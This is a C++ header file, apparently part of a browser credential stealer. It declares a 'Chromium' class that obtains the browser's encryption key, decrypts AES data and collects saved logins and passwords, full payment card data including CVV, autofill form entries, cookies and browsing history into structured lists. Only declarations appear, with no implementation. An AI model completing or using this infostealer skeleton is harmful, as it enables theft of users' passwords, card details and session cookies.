#pragma once
namespace ChromiumData {
	struct PassData {
		string Url = string();
		string Login = string();
		string Password = string();
	};

	struct CardData {
		string Number = string();
		string Cvv = string();
		string Date = string();
		string Name = string();
		string Url = string();
	};

	struct FormData {
		string Name = string();
		string Value = string();
	};

	struct CookieData {
		string Host = string();
		string Path = string();
		string Timestamp = string();
		string Name = string();
		string Value = string();
	};

	struct HistoryData {
		string Title = string();
		string Url = string();
	};
}

class Chromium
{
private:
	string path;
	string tempDbPath;
	string encKey;

	string DecryptAES(string bytes);
public:
	Chromium(string path, string tempDbPath)
	{
		this->path = path;
		this->tempDbPath = tempDbPath;
	}

	vector<ChromiumData::PassData> passData;
	vector<ChromiumData::CardData> cardData;
	vector<ChromiumData::FormData> formData;
	vector<ChromiumData::CookieData> cookieData;
	vector<ChromiumData::HistoryData> historyData;

	void GetEncKey();
	void GetPasswords();
	void GetCards();
	void GetForms();
	void GetCookies();
	void GetHistory();
};

